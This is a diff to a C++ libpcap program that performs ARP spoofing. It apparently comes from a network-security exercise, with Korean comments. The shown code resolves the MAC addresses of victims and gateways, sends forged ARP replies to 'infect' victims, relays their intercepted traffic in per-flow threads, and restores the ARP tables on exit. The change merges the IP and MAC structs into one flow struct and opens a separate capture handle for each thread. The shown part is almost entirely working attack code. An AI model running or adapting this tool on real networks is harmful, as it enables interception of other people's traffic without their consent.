@@ -25,15 +25,11 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 #pragma pack(push, 1)
-struct sender_target_ip final {
-	Ip sender;
-	Ip target;
+struct sender_target_flow final {
+	Ip sip, tip;
+	Mac smac, tmac;
 };
 
-struct sender_target_mac final {
-    Mac sender;
-    Mac target;
-};
 #pragma pack(pop)
 
 void usage() {
@@ -64,8 +60,7 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
     }
 
-    vector<sender_target_ip> send_tar_ips;
-    vector<sender_target_mac> send_tar_macs;
+    vector<sender_target_flow> flows;
     char errbuf[PCAP_ERRBUF_SIZE];
 
     //packet snap length를 기존 BUFSIZ(8192)에서 65536으로 증가시켜 큰 패킷도 감지
@@ -77,40 +72,38 @@ int main(int argc, char *argv[]) {
     }
 
     for (int i = 2; i < argc; i += 2) { //check format x.x.x.x
-        Ip send_ip = Ip(argv[i]);
+        Ip sender_ip = Ip(argv[i]);
         Ip target_ip = Ip(argv[i + 1]);
-	
-        send_tar_ips.push_back(sender_target_ip{send_ip, target_ip});
-    }
 
-    //cout << string(send_tar_ips[0].sender) << endl;
-
-    vector<thread> threads;
-
-    for (int i = 0; i < send_tar_ips.size(); i++) {
         //send arp request
         Mac sender_mac = Mac::nullMac();
         Mac target_mac = Mac::nullMac();
         //get sender mac addr
         if (!send_arp_request(pcap, attacker_mac, attacker_ip,
-            send_tar_ips[i].sender, sender_mac)) {
-            cout << "Failed to get mac addr\n";
-            return false;
-        }
-        //get target mac addr
-        if (!send_arp_request(pcap, attacker_mac, attacker_ip,
-            send_tar_ips[i].target, target_mac)) {
+            sender_ip, sender_mac)) {
             cout << "Failed to get mac addr\n";
             return false;
             }
+        //get target mac addr
+        if (!send_arp_request(pcap, attacker_mac, attacker_ip,
+            target_ip, target_mac)) {
+            cout << "Failed to get mac addr\n";
+            return false;
+            }
+	
+        flows.push_back(sender_target_flow{sender_ip, target_ip, sender_mac, target_mac});
+        cout << string(flows[i].smac) << ", " << string(flows[i].tmac) << endl;
+    }
 
-	    cout << string(sender_mac) << endl;
-        cout << string(target_mac) << endl;
-        send_tar_macs.push_back({sender_mac, target_mac});
+    //cout << string(flows[0].sender) << endl;
+
+    vector<thread> threads;
+
+    for (int i = 0; i < flows.size(); i++) {
         //send arp reply to infect
         //sender = victim , target = gateway
-        if (!arp_infection(pcap, attacker_mac, send_tar_macs[i].sender,
-            send_tar_ips[i].sender, send_tar_ips[i].target)) {
+        if (!arp_infection(pcap, attacker_mac, flows[i].smac,
+            flows[i].sip, flows[i].tip)) {
             cout << "Failed ARP infection\n";
             return false;
         }
@@ -118,13 +111,13 @@ int main(int argc, char *argv[]) {
         //start relay
         //sender = victim , target = gateway
         //thread
+
         threads.push_back(thread([&, i](){
                 // sender→target capture
-                    while (running.load()) {
-
-                    arp_relay(pcap, attacker_mac, send_tar_macs[i].sender, send_tar_macs[i].target,
-                    send_tar_ips[i].sender, send_tar_ips[i].target);
-                    }
+                pcap_t* thread_pcap = pcap_open_live(interface.c_str(), 65536, 1, 1, errbuf);
+                while (running.load()) {arp_relay(thread_pcap, attacker_mac, flows[i].smac, flows[i].tmac,
+                flows[i].sip, flows[i].tip);}
+                pcap_close(thread_pcap);
         }));
 
     }
@@ -136,16 +129,18 @@ int main(int argc, char *argv[]) {
         cin.get(c);
 
     running.store(false);
-    this_thread::sleep_for(chrono::seconds(10));
+    cout << "Ending process" << endl;
+    this_thread::sleep_for(chrono::seconds(2));
+
 
     for (auto& t : threads) t.join(); //exit thread
 
-    cout << "Ending process" << endl;
+
     //recover
-    for (int i = 0; i < send_tar_macs.size(); i++) {
+    for (int i = 0; i < flows.size(); i++) {
         //send normal packet
-        if (!arp_infection(pcap, send_tar_macs[i].target, send_tar_macs[i].sender,
-            send_tar_ips[i].target, send_tar_ips[i].sender)) {
+        if (!arp_infection(pcap, flows[i].tmac, flows[i].smac,
+            flows[i].tip, flows[i].sip)) {
             cout << "Failed ARP infection\n";
             return false;
             }
